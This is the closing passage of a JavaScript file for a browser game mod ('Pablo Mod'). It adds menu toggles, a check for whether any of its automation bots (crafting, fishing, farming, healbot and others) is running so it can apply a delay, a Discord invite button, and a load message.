  { label: 'Sort Fooders', state: () => dsk.sort?.enabled,        toggle: () => dsk.commands['/sort']() },
);
dsk.menu.rebuild();
//check bot para aplicar o delay e não da packet spam

dsk.checkBotActive = () => {
  return dsk.craft?.enabled       ||
		 dsk.repair?.enabled      ||
         dsk.armas?.enabled       ||
         dsk.sword?.enabled       ||
         dsk.hammer?.enabled      ||
         dsk.destruction?.enabled ||
         dsk.cooking?.enabled     ||
         dsk.smelting?.enabled    ||
         dsk.fish?.enabled        ||
         dsk.farm?.enabled        ||
         dsk.knit?.enabled        ||
         dsk.myst?.enabled        ||
         dsk.clay?.enabled        ||
         dsk.healbot?.enabled     ||
         dsk.rotation?.enabled    ||
         false;
};

dsk.on('postLoop', () => {
  dsk.botActive = dsk.checkBotActive();
});

dsk.menu.addChild(dsk.menu.pageLabel);

// Botão Discord dentro do menu
dsk.menu.btnDiscord = jv.Button.create(0, 0, 100, '💬 Discord', dsk.menu, 22);
jv.bottom(dsk.menu.btnDiscord, 4);
dsk.menu.btnDiscord.x = 4;
dsk.menu.btnDiscord.title.style.fill = 0x7289DA;
dsk.menu.btnDiscord.on_click = () => {
  window.open('https://discord.gg/XkVhYENK7k', '_blank');
};

dsk.menu.addChild(dsk.menu.pageLabel);

// ── INICIALIZAÇÃO ────────────────────────────────────────────

dsk.once('postPacket:accepted', () => {
  dsk.localMsg('Pablo Mod Load, type /cmd for commands', 'pink');
});

})();
